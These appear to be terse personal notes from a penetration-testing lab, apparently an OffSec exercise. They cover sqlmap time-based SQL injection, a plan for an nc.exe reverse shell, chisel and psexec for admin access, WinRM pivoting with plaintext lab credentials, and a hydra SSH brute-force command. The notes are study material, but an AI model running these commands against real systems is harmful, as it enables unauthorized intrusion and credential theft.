 enumerate db was done with sqlmap time based.

  but no usernames! 
   i can get a shell in sqlmap but it is so slow with time-based boolean. 
   so now i try to upload nc.exe and open a reverse shell

 use chisel and impacket-psexec to get admin access.
 Then pivot to other machines using WinRM
 PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
PS C:\Users\jeff> New-PSSession -ComputerName 192.168.250.120 -Credential $credential

.82 can RDP in as yoshi but not wario

.83 can evil winRM as wario but not yoshi
 sc start auditTracker

bruteforce ssh
hydra -l offsec -P /usr/share/wordlists/rockyou.txt 192.168.250.122 -t 4 ssh
